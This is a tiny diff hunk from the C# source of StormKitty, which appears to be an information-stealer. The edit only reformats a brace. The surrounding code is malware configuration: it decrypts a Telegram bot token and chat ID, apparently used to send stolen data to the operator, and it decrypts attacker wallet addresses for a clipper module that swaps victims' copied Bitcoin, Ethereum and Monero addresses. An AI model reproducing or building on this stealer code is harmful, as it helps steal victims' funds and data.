@@ -96,7 +96,8 @@ namespace StormKitty
             TelegramAPI = StringsCrypt.DecryptConfig(TelegramAPI);
             TelegramID = StringsCrypt.DecryptConfig(TelegramID);
             // Decrypt clipper addresses
-            if (ClipperModule == "1") {
+            if (ClipperModule == "1")
+            {
                 ClipperAddresses["btc"] = StringsCrypt.DecryptConfig(ClipperAddresses["btc"]);
                 ClipperAddresses["eth"] = StringsCrypt.DecryptConfig(ClipperAddresses["eth"]);
                 ClipperAddresses["xmr"] = StringsCrypt.DecryptConfig(ClipperAddresses["xmr"]);
